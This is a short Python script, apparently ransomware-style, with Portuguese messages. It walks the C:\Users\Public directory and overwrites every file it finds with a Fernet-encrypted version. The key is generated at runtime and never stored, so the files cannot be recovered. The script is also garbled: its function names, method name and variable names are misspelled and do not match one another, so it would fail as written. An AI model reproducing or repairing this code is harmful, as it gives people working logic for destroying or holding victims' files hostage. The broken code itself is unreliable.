import os 
from cryptography.fernet import Fernet 

key = Fernet.generate_key()
cipher = Fernet(key)

def encrypy_file(directory):
    for root, dirs, files in os.walk(directory):
        for file in files:
            try:
                filepath = os.path.join(root, file)
                with open(filepath, 'rb') as f:
                    file_data = f.read()    
                encrypy_data = cipher.encrypy(file_data)   
                with open(filepath, 'wb') as f:
                    f.write(encrypted_data)
                print(f'Arquivo criptografado: {filepath}')
            except Exception as e:
                print(f'Erro ao criptografar {file}: {e}')

# Diretório para criptografar (usar no disco local ou arquivos específicos)
directory_to_encrypt = "C:\\Users\\Public"
encrypt_files(directory_to_encrypt)